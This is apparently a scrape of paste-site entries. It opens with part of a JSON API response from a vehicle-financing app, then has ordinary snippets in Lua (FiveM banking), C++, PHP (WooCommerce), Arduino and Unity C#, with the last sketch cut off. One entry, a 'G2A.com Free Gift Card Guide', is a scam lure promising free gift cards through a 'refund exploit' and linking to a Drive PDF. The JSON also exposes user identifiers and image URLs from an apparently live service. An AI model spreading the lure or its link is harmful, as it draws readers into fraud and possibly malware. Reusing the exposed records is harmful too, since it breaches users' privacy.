                    ""uv_submission_id"": ""7fd2a550-98a4-4484-a838-4c9fc8cdb714"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_condition"",
                    ""label"": ""Status Kepemilikan"",
                    ""field"": ""ownership_status"",
                    ""old_value"": null,
                    ""value"": ""individual"",
                    ""comment"": """",
                    ""approved_at"": 1715744748,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 9,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""registration_validity_period"": {
                    ""uv_submission_id"": ""b733372f-3fb3-44ed-ad1a-1a370bcf698b"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_condition"",
                    ""label"": ""Masa Berlaku STNK"",
                    ""field"": ""registration_validity_period"",
                    ""old_value"": null,
                    ""value"": ""04-2023"",
                    ""comment"": """",
                    ""approved_at"": 1715744748,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 14,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                ""tyre_condition"": {
                    ""uv_submission_id"": ""9eeb4985-6958-4f29-8a57-81ebecb59d04"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_condition"",
                    ""label"": ""Kondisi Ban"",
                    ""field"": ""tyre_condition"",
                    ""old_value"": null,
                    ""value"": ""80 - 89%"",
                    ""comment"": """",
                    ""approved_at"": 1715744748,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 11,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                }
            },
            ""vehicle_images"": [
                {
                    ""uv_submission_id"": ""c5edbdd5-bb52-4f2e-8b4a-5ef78b1cec9b"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_images"",
                    ""label"": ""Tampak Depan"",
                    ""field"": ""Tampak Depan"",
                    ""old_value"": {
                        ""vehicle_image_id"": ""5e4e13bd-0374-45d9-a374-f0ef7c64b7ec"",
                        ""image_id"": ""28bc840c-ea99-4cf7-ad22-55a1d1c65bc3"",
                        ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                        ""vit_id"": ""4f0daecb-d4ce-4593-bff3-cd79f8d8cd1b"",
                        ""created_at"": 1714364288,
                        ""updated_at"": 1714364288,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""28bc840c-ea99-4cf7-ad22-55a1d1c65bc3"",
                            ""path"": ""vehicle/1714364198.png"",
                            ""size"": 689178,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                            ""name"": ""1714364198.png"",
                            ""purpose"": ""vehicle"",
                            ""created_at"": 1714364198,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1714364198.png?w=500"",
                            ""user"": null
                        }
                    },
                    ""value"": {
                        ""vehicle_image_id"": ""5e4e13bd-0374-45d9-a374-f0ef7c64b7ec"",
                        ""image_id"": ""139bd21e-30ab-4eeb-868e-1aa38eb8584a"",
                        ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                        ""vit_id"": ""4f0daecb-d4ce-4593-bff3-cd79f8d8cd1b"",
                        ""created_at"": 1714364288,
                        ""updated_at"": 1715933762,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""139bd21e-30ab-4eeb-868e-1aa38eb8584a"",
                            ""path"": ""vehicle/1715933759.jpg"",
                            ""size"": 145194,
                            ""mimetype"": ""image/jpeg"",
                            ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                            ""name"": ""1715933759.jpg"",
                            ""purpose"": ""vehicle"",
                            ""created_at"": 1715933759,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1715933759.jpg?w=500"",
                            ""user"": null
                        }
                    },
                    ""comment"": """",
                    ""approved_at"": 1715934033,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 16,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                {
                    ""uv_submission_id"": ""36f5ae0c-c173-4193-bd5f-b2c2555e1c6f"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_images"",
                    ""label"": ""Tampak Samping Kanan"",
                    ""field"": ""Tampak Samping Kanan"",
                    ""old_value"": null,
                    ""value"": {
                        ""vehicle_image_id"": ""6eea94c6-e115-4515-bea1-94399c572928"",
                        ""image_id"": ""3d1cb2c3-235f-497a-9787-03542bce494a"",
                        ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                        ""vit_id"": ""94d995ae-989d-4384-bfe6-4c5c4e927bdc"",
                        ""created_at"": 1714364288,
                        ""updated_at"": 1714364288,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""3d1cb2c3-235f-497a-9787-03542bce494a"",
                            ""path"": ""vehicle/1714364210.png"",
                            ""size"": 689178,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                            ""name"": ""1714364210.png"",
                            ""purpose"": ""vehicle"",
                            ""created_at"": 1714364210,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1714364210.png?w=500"",
                            ""user"": null
                        }
                    },
                    ""comment"": """",
                    ""approved_at"": 1715934033,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 17,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                {
                    ""uv_submission_id"": ""28cb9e08-6331-45db-9abe-8e346ac8c7ec"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_images"",
                    ""label"": ""Tampak Samping Kiri"",
                    ""field"": ""Tampak Samping Kiri"",
                    ""old_value"": null,
                    ""value"": {
                        ""vehicle_image_id"": ""bae1c183-e1f9-4305-b02a-f76197da2b0f"",
                        ""image_id"": ""92dc89b6-9172-4c0c-acaf-87084f698d9a"",
                        ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                        ""vit_id"": ""8335ed3b-9380-48e1-85c1-42ffa1e2dea6"",
                        ""created_at"": 1714364288,
                        ""updated_at"": 1714364288,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""92dc89b6-9172-4c0c-acaf-87084f698d9a"",
                            ""path"": ""vehicle/1714364227.png"",
                            ""size"": 689178,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                            ""name"": ""1714364227.png"",
                            ""purpose"": ""vehicle"",
                            ""created_at"": 1714364227,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1714364227.png?w=500"",
                            ""user"": null
                        }
                    },
                    ""comment"": """",
                    ""approved_at"": 1715934033,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 18,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                {
                    ""uv_submission_id"": ""f4736252-2c1f-4eda-b6fe-435e223534aa"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_images"",
                    ""label"": ""Tampak Belakang"",
                    ""field"": ""Tampak Belakang"",
                    ""old_value"": null,
                    ""value"": {
                        ""vehicle_image_id"": ""3d80f3b0-6cbf-4f8b-828b-c59ebd165077"",
                        ""image_id"": ""fa86ca46-5f83-4183-b4bf-da9b7c4b8b7a"",
                        ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                        ""vit_id"": ""b8aeade6-4de9-4b46-be02-0a4d1994602c"",
                        ""created_at"": 1714364288,
                        ""updated_at"": 1714364288,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""fa86ca46-5f83-4183-b4bf-da9b7c4b8b7a"",
                            ""path"": ""vehicle/1714364239.png"",
                            ""size"": 689178,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                            ""name"": ""1714364239.png"",
                            ""purpose"": ""vehicle"",
                            ""created_at"": 1714364239,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1714364239.png?w=500"",
                            ""user"": null
                        }
                    },
                    ""comment"": """",
                    ""approved_at"": 1715934033,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 19,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                },
                {
                    ""uv_submission_id"": ""f4fd794d-641e-46d2-80ce-1ed9b50d516b"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_images"",
                    ""label"": ""Spidometer Kendaraan"",
                    ""field"": ""Spidometer Kendaraan"",
                    ""old_value"": null,
                    ""value"": {
                        ""vehicle_image_id"": ""a12fdd5b-324c-4c03-80b6-5269d9eddc3a"",
                        ""image_id"": ""fef108de-e6ab-4a7c-b9db-376674b28c15"",
                        ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                        ""vit_id"": ""00746412-72cc-46fd-b6b7-64f16e0276f7"",
                        ""created_at"": 1714364288,
                        ""updated_at"": 1714364288,
                        ""deleted_at"": 0,
                        ""vehicle_image_type"": null,
                        ""image"": {
                            ""media_id"": ""fef108de-e6ab-4a7c-b9db-376674b28c15"",
                            ""path"": ""vehicle/1714364254.png"",
                            ""size"": 689178,
                            ""mimetype"": ""image/png"",
                            ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                            ""name"": ""1714364254.png"",
                            ""purpose"": ""vehicle"",
                            ""created_at"": 1714364254,
                            ""deleted_at"": 0,
                            ""media_url"": ""https://muf-superapps.imgix.net/vehicle/1714364254.png?w=500"",
                            ""user"": null
                        }
                    },
                    ""comment"": """",
                    ""approved_at"": 1715934033,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 20,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                }
            ],
            ""vehicle_estimation"": {
                ""price"": {
                    ""uv_submission_id"": ""6345c73d-4d31-484b-9c44-e0815333df52"",
                    ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                    ""type"": ""vehicle_estimation"",
                    ""label"": ""Harga Kendaraan"",
                    ""field"": ""price"",
                    ""old_value"": null,
                    ""value"": 240000000,
                    ""comment"": """",
                    ""approved_at"": 1715744961,
                    ""rejected_at"": 0,
                    ""revision_at"": 0,
                    ""returned_at"": 0,
                    ""corrected_by"": null,
                    ""position"": 21,
                    ""removed_at"": 0,
                    ""created_at"": 1715700322,
                    ""updated_at"": 1715936340,
                    ""user_vehicle"": null,
                    ""corrected_by_user"": null
                }
            }
        },
        ""activity_id"": """",
        ""activity_history"": [
            {
                ""_id"": ""66471c5412a8b3e81d2c7d15"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""revision-required"",
                ""metadata"": null,
                ""created_at"": 1715936340,
                ""updated_at"": 1715936340
            },
            {
                ""_id"": ""66471bb412a8b3e81d2c7d14"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""revision-returned"",
                ""metadata"": null,
                ""created_at"": 1715936180,
                ""updated_at"": 1715936180
            },
            {
                ""_id"": ""664715db12a8b3e81d2c7d13"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""revision-required"",
                ""metadata"": null,
                ""created_at"": 1715934683,
                ""updated_at"": 1715934683
            },
            {
                ""_id"": ""664713d812a8b3e81d2c7d12"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""revision-returned"",
                ""metadata"": null,
                ""created_at"": 1715934168,
                ""updated_at"": 1715934168
            },
            {
                ""_id"": ""6647135b12a8b3e81d2c7d11"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""revision-required"",
                ""metadata"": null,
                ""created_at"": 1715934043,
                ""updated_at"": 1715934043
            },
            {
                ""_id"": ""6647124212a8b3e81d2c7d0f"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""revision-returned"",
                ""metadata"": null,
                ""created_at"": 1715933762,
                ""updated_at"": 1715933762
            },
            {
                ""_id"": ""664430cfc3100cb9e29f6e26"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""revision-required"",
                ""metadata"": null,
                ""created_at"": 1715744975,
                ""updated_at"": 1715744975
            },
            {
                ""_id"": ""66438262c3100cb9e29f6e21"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""on-process"",
                ""metadata"": null,
                ""created_at"": 1715700322,
                ""updated_at"": 1715700322
            },
            {
                ""_id"": ""6655b418c6a527dfd9c5529b"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""waiting-verification"",
                ""metadata"": null,
                ""created_at"": 1715700322,
                ""updated_at"": 1715700322
            },
            {
                ""_id"": ""6655b418c6a527dfd9c5529c"",
                ""data_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
                ""activity_type"": ""user-vehicle"",
                ""status"": ""new-submission"",
                ""metadata"": null,
                ""created_at"": 1715700322,
                ""updated_at"": 1715700322
            }
        ]
    },
    ""message"": ""Success"",
    ""errors"": null
}"
raATZrz1,OKOKBank,Lindholmbrahe,Lua,Tuesday 28th of May 2024 05:25:29 AM CDT,"-- 
-- Society
--
local usingNewQBBanking = GetResourceState(""qb-banking"") == ""started"" and tonumber(string.sub(GetResourceMetadata(""qb-banking"", ""version""), 1, 3)) >= 2
local usingokokBanking = GetResourceState(""okokBanking"") == ""started"" -- added support for okokBanking

function Framework.Server.RemoveFromSocietyFund(societyName, type, amount)
  if Config.Framework == ""QBCore"" then
    if usingokokBanking then  -- added support for okokBanking
      exports['okokBanking']:RemoveMoney(societyName, amount)  -- added support for okokBanking
    elseif usingNewQBBanking then -- changed
      exports['qb-banking']:RemoveMoney(societyName, amount)
    else
      if type == ""job"" then
        exports['qb-management']:RemoveMoney(societyName, amount)
      elseif type == ""gang"" then
        exports['qb-management']:RemoveGangMoney(societyName, amount)
      end
    end
  elseif Config.Framework == ""ESX"" then
    if type == ""cash"" then type = ""money"" end

    TriggerEvent('esx_society:getSociety', societyName, function(society)
      TriggerEvent('esx_addonaccount:getSharedAccount', society.account, function(account)
        account.removeMoney(amount)
      end)
    end)
  end
end

Framework.Server.CreateCallback(""jg-dealerships:server:get-society-balance"", function(src, cb, society, type)
  if Config.Framework == ""QBCore"" then
    if usingokokBanking then -- added support for okokBanking
      cb(exports['okokBanking']:GetAccount(society)) -- added support for okokBanking
    elseif usingNewQBBanking then -- changed
      cb(exports['qb-banking']:GetAccountBalance(society))
    else
      if type == ""job"" then
        cb(exports['qb-management']:GetAccount(society))
      elseif type == ""gang"" then
        cb(exports['qb-management']:GetGangAccount(society))
      end
    end
  elseif Config.Framework == ""ESX"" then
    if type == ""cash"" then type = ""money"" end

    TriggerEvent('esx_society:getSociety', society, function(data)
      if not data then return cb(0) end
      TriggerEvent('esx_addonaccount:getSharedAccount', data.account, function(account)
        cb(account.money)
      end)
    end)
  end
end)"
CvSQLKNW,swap to max,gitman3,C++,Tuesday 28th of May 2024 05:21:47 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

int main() {
    int n;
    cin >> n;
    vector<int> A(n);

    for (int i = 0; i < n; i++) {
        cin >> A[i];
    }

    bool swapped = 1;

    while (swapped) {
        swapped = 0;
        for (int i = 0; i < n - 1; i++) {
            long long current = A[i] * (i + 1) + A[i + 1] * (i + 2);
            long long updated = A[i + 1] * (i + 1) + A[i] * (i + 2);

            if (current < updated) {
                swap(A[i], A[i + 1]);
                swapped = 1;
            }
        }
    }

    long long sum = 0;
    for (int i = 0; i < n; ++i) {
        sum += A[i] * (i + 1);
    }

    cout << sum << endl;

    return 0;
}
"
LBYpBEkE,WPGB - Variable product - Show Min Price,mrcbt,PHP,Tuesday 28th of May 2024 05:11:38 AM CDT,"<?php 

function register_product_min_price_block( $blocks ) {

    // ""product_min_price_block"" corresponds to the block slug.
    $blocks['product_min_price_block'] = [
        'name'            => 'Product - Min Price',
        'render_callback' => 'render_product_min_price_block',
    ];

    return $blocks;
}
add_filter( 'wp_grid_builder/blocks', 'register_product_min_price_block' );

function render_product_min_price_block() {

    // Object can be a post, term or user.
    $object = wpgb_get_object();

    // If this is not a product post type.
    if (
        ! isset( $object->post_type ) ||
        'product' !== $object->post_type ||
        ! function_exists( 'wc_get_product' )
    ) {
        return;
    }

    $product = wc_get_product( $object->ID );

    if ( empty( $product ) ) {
        return;
    }

    // Check if the product is variable.
    if ( $product->is_type( 'variable' ) ) {
        $min_price = $product->get_variation_price( 'min', true );
        echo sprintf( __( 'A partir de %1$s', 'woocommerce' ), wc_price( $min_price ) ); //change 'A partir de' to something you like. Ex: From or Starting at.
    } else {
        // If not a variable product, display the regular price.
        echo $product->get_price_html();
    }
}"
F9AkkxUJ,Servo Control rev_01,pleasedontcode,Arduino,Tuesday 28th of May 2024 04:57:22 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Servo Control
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-28 09:56:13

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* I want to add a pushputton that controls the servo */
	/* motor */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Servo.h>  //https://github.com/arduino-libraries/Servo

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs(void);

/***** DEFINITION OF PWM OUTPUT PINS *****/
const uint8_t mypush_Servomotor_PWMSignal_PIN_D9 = 9;  // Changed to pin 9 as per the example
const uint8_t potpin = A0;  // Potentiometer pin
const uint8_t buttonPin = 2;  // Push button pin

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
uint8_t mypush_Servomotor_PWMSignal_PIN_D9_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float mypush_Servomotor_PWMSignal_PIN_D9_phyData = 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Servo myservo;  // Create servo object to control a servo

void setup(void)
{
  // put your setup code here, to run once:
  myservo.attach(mypush_Servomotor_PWMSignal_PIN_D9);  // Attaches the servo on pin 9 to the servo object
  pinMode(buttonPin, INPUT);  // Set the button pin as an input
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  updateOutputs();  // Refresh output data
}

void updateOutputs()
{
  static bool buttonPressed = false;  // Variable to store the button state

  // Read the button state
  if (digitalRead(buttonPin) == HIGH) {
    buttonPressed = !buttonPressed;  // Toggle the button state
    delay(200);  // Debounce delay
  }

  if (buttonPressed) {
    int val = analogRead(potpin);  // Read the value of the potentiometer
    val = map(val, 0, 1023, 0, 180);  // Scale it to use it with the servo (value between 0 and 180)
    myservo.write(val);  // Set the servo position according to the scaled value
  } else {
    myservo.write(90);  // Set the servo to the neutral position (90 degrees) when the button is not pressed
  }

  delay(15);  // Wait for the servo to reach the position
}

/* END CODE */"
5RW1LpKh,LipSync,MaximilianPs,C#,Tuesday 28th of May 2024 04:56:25 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEditor;
using UnityEngine;
using UnityEngine.UIElements;

namespace BrokenWings
{
    [RequireComponent(typeof(AudioSource))]
    public class LipSync : MonoBehaviour
    {
        private AudioSource audioSource;
        private float[] clipSampleData;
        private const int sampleDataLength = 1024;
        private float clipLoudness = 0.0f;

        [SerializeField] private Transform lipsObject;
        [SerializeField] private AudioClip[] sentences;
        [SerializeField][Range(0.01f, 5.0f)] private float sensitivity = 1.0f;
        private int sentenceTracker = 0;

        [Tooltip(""This is used to activate the speech, once activated the speech will start and the system will deactivate it, so you can activate it again for the next sentence."")]
        [SerializeField] GameObject activator;

        [SerializeField] GameObject brows;
        Animator browsAnim;
        [Tooltip(""Eyes Game Object, to be set by hand, Note that the eyes are scaled on Y axis while the mouth on Z!"")]
        [SerializeField] GameObject eyes;
        [SerializeField] float eyeOpene = 1f;
        [SerializeField] float eyeClose = 0.01f;
        [Tooltip(""Random interval for the next blink in second"")]
        [Range(2f, 20f)]
        [SerializeField] float blinkInterval;
        [SerializeField] private float blinkDuration = 0.1f;
        private float blinkTimer = 0f;
        private bool isBlinking = false;

        public enum EmotionState
        {
            Idle = 0,
            RiseBrow = 1,
            Suprise = 2,
            Fear = 3,
            Anger = 4,
            Happy = 5   // This should Rise the bow and squeeze the eyes at 60%
        }

        public EmotionState currentEmotion = EmotionState.Idle;
        public EmotionState CurrentEmotion
        {
            get { return currentEmotion; }
            set
            {
                currentEmotion = value;
                browsAnim.SetInteger(""EmotionalState"", (int)currentEmotion);
            }
        }

        private bool _play = false;
        public bool Play
        {
            get { return _play; }
            set
            {
                _play = value;
            }
        }

        private enum ScalingAxis
        {
            X,
            Y,
            Z
        }
        [Tooltip(""The axis that need to be scaled"")]
        [SerializeField] private ScalingAxis selectedAxis = ScalingAxis.Z;
        // Sets the value to maximize and minimize the Y scale for the lips
        [SerializeField] private float minScale = 0.13f;
        [SerializeField] private float maxScale = 1f;
        private float maxLoudness = 0f;
        

        private void Start()
        {
            audioSource = GetComponent<AudioSource>();
            clipSampleData = new float[sampleDataLength];
            sentenceTracker = 0;
            audioSource.Stop();

            // Brows
            if (brows == null)
                Debug.LogError(""!!! NO BROWS !!! \n "" + gameObject.name + ""Didn't have any brows assigned!"");

            browsAnim = brows.GetComponent<Animator>();

            // Eyes
            if (eyes == null)
                Debug.LogError(""!!! NO EYES !!! \n "" + gameObject.name + ""Didn't have any eyes assigned!"");

        }

        private void Update()
        {
            if(activator.activeSelf)
            { 
                activator.SetActive(false);
                Play = true;
            }

            if(_play)
            {
                if(sentenceTracker >= sentences.Length) sentenceTracker = 0;
                audioSource.clip = sentences[sentenceTracker];
                audioSource.Play();

                _play = false;
                sentenceTracker++;
            }

            if(audioSource.isPlaying) 
                MoveLips();
            else
            {
                IsBlinking();
            }
        }

        private void MoveLips()
        {
            if (audioSource.isPlaying)
            {
                audioSource.clip.GetData(clipSampleData, audioSource.timeSamples);

                if (audioSource.timeSamples > 0)
                {
                    float sumLoudness = 0f;
                    foreach (var Sample in clipSampleData)
                    {
                        sumLoudness += Mathf.Abs(Sample);
                    }

                    // Get the average loudness
                    clipLoudness = sumLoudness / clipSampleData.Length;

                    // Aggiorna il valore massimo di loudness se necessario
                    if (clipLoudness > maxLoudness)
                    {
                        maxLoudness = clipLoudness;
                    }

                    // Normalize the loudness to the maximum observed value
                    clipLoudness /= maxLoudness;

                    // Map normalized loudness within the Y scale
                    float scaleZValue = Mathf.Lerp(minScale, maxScale, clipLoudness);

                    // Debug.Log(clipLoudness);

                    // Close the mouth when clipLoudness is low.
                    if (clipLoudness <= 0) scaleZValue = minScale;

                    // Map normalized loudness within the selected scaling axis
                    float scaleValue = 0f;

                    // Calculate the scaled sensitivity based on the maximum observed loudness
                    float scaledSensitivity = sensitivity * maxLoudness;

                    switch (selectedAxis)
                    {
                        case ScalingAxis.X:
                            scaleValue = Mathf.Lerp(minScale, maxScale, clipLoudness * scaledSensitivity);
                            lipsObject.localScale = new Vector3(scaleValue, lipsObject.localScale.y, lipsObject.localScale.z);
                            break;
                        case ScalingAxis.Y:
                            scaleValue = Mathf.Lerp(minScale, maxScale, clipLoudness);
                            lipsObject.localScale = new Vector3(lipsObject.localScale.x, scaleValue, lipsObject.localScale.z);
                            break;
                        case ScalingAxis.Z:
                            scaleValue = Mathf.Lerp(minScale, maxScale, clipLoudness);
                            lipsObject.localScale = new Vector3(lipsObject.localScale.x, lipsObject.localScale.y, scaleValue);
                            break;
                    }

                    lipsObject.localScale = new Vector3(lipsObject.localScale.x, lipsObject.localScale.y, scaleZValue);
                }
            }
        }

        public void BlinkEyes(float ec, float eo)
        {
            float randomScale = Random.Range(ec, eo);
            Vector3 newScale = eyes.transform.localScale;
            newScale.y = randomScale;
            eyes.transform.localScale = newScale;
        }

        private void ResetEyeScale()
        {
            Vector3 newScale = eyes.transform.localScale;
            newScale.y = 1f;
            eyes.transform.localScale = newScale;
        }

        private void IsBlinking()
        {
            if (!isBlinking)
            {
                // Generate a random time interval for the next blink
                float randomInterval = Random.Range(1f, blinkInterval);
                blinkTimer += Time.deltaTime;

                if (blinkTimer >= randomInterval)
                {
                    // Start blinking
                    isBlinking = true;
                    blinkTimer = 0f;
                    BlinkEyes(eyeClose, eyeOpene);
                }
            }
            else
            {
                // Continue blinking for the blink duration
                blinkTimer += Time.deltaTime;

                if (blinkTimer >= blinkDuration)
                {
                    // Stop blinking
                    isBlinking = false;
                    blinkTimer = 0f;
                    ResetEyeScale();
                }
            }
        }

        public void SetSentence(int sentence)
        {
            sentenceTracker = sentence;
        }    
    }

}
"
3s6cVcNU,💸G2A.com Free Gift Card Guide 2024 May🚀,Alfonso1119,Python,Tuesday 28th of May 2024 04:53:36 AM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1x81p1KKCkmh5SSkfIEdkJrUs8fx8xJli/view?usp=g2a_refund_exploit_2068187.pdf

Working as of:

29 May 2024"
DNpc6aAX,"""Relay Control"" rev_01",pleasedontcode,Arduino,Tuesday 28th of May 2024 04:50:16 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Relay Control""
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-28 09:48:47

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Designer home automation system in which the ESP */
	/* 32 is able to control 9 relays with using ESP */
	/* RainMaker application and from also control by */
	/* manual switches. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Relay.h>  //https://github.com/rafaelnsantos/Relay

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs(void);

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t Relaymodule_RelayModule_Signal_PIN_D4  = 4;
const uint8_t Relaymodule_RelayModule_Signal_PIN_D13 = 13;
const uint8_t Relaymodule_RelayModule_Signal_PIN_D14 = 14;
const uint8_t Relaymodule_RelayModule_Signal_PIN_D15 = 15;
const uint8_t Relaymodule_RelayModule_Signal_PIN_D16 = 16;
const uint8_t Relaymodule_RelayModule_Signal_PIN_D17 = 17;
const uint8_t Relaymodule_RelayModule_Signal_PIN_D18 = 18;
